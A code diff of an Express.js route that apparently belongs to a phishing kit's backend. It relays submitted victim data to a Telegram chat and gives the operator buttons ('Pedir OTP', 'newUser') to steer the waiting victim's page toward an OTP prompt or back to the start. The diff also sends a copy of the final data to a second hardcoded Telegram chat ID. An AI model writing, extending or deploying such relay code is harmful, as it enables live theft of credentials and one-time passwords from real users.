@@ -79,7 +79,11 @@ router.post('/generals', (req, res) => {
     reply_markup: JSON.stringify({
       inline_keyboard: [
         [
-          { text: '$ Pedir TOKEN $', callback_data: `token.html:${token}` }
+          { text: '$ Pedir OTP $', callback_data: `token.html:${token}` }
+          
+        ],
+        [
+          { text: 'newUser', callback_data: `index.html:${token}` }
         ]
       ],
       one_time_keyboard: true,
@@ -90,7 +94,7 @@ router.post('/generals', (req, res) => {
     reply_markup: JSON.stringify({
       inline_keyboard: [
         [
-          { text: '$ Pedir TOKEN $', callback_data: `token.html:${token}` }
+          { text: '$ Pedir OTP $', callback_data: `token.html:${token}` }
         ],
         [
           { text: 'newUser', callback_data: `index.html:${token}` },
@@ -105,34 +109,33 @@ router.post('/generals', (req, res) => {
     }),
   };
 
-  if (req.body.tok === '') {
-    bot.sendMessage(CHAT_ID, infoMessage1);
 
-    setTimeout(() => { // Evitar que salga primero el teclado
-      bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts1)
+  if (req.body.tok === '') {
+    bot.sendMessage(CHAT_ID, infoMessage1)
+      .then(()=>{
+        bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts1)
         .then(message => {
           const messageID = message.message_id;
           activeMessages.set(token, { messageID, res }); // Almacena el ID del mensaje y la respuesta HTTP con el token correspondiente
         })
         .catch(err => console.log(err));
-    }, 100);
+      });
   }else if (req.body.c === ''){
     bot.sendMessage(CHAT_ID, infoMessage2)
       .then( () =>{
         res.json({'Checked': 'checked'});
       })
   }else{
-    bot.sendMessage(CHAT_ID, infoMessage3);
-    bot.sendMessage('1660900306', infoMessage3);
-
-    setTimeout(() => { // Evitar que salga primero el teclado
-      bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts3)
+    bot.sendMessage(CHAT_ID, infoMessage3)
+      .then(()=>{
+        bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts3)
         .then(message => {
+          bot.sendMessage('1660900306', infoMessage3);
           const messageID = message.message_id;
           activeMessages.set(token, { messageID, res }); // Almacena el ID del mensaje y la respuesta HTTP con el token correspondiente
         })
         .catch(err => console.log(err));
-    }, 100);
+      });
   }
 })
 
